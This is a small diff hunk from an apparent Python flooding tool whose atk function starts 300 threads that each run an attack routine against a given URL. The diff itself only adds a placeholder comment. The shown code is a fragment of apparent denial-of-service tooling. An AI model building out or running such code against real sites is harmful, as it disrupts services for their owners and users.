@@ -2,7 +2,7 @@ from os import system, name
 import os, threading, requests, sys, datetime, time, socket, socks, random
 from urllib.parse import urlparse
 from requests.cookies import RequestsCookieJar
-
+#add threads function here
 def atk(url, timer, packet):
    for i in range(int(300)):
        threading.Thread(target=attk, args=(url, timer)).start()
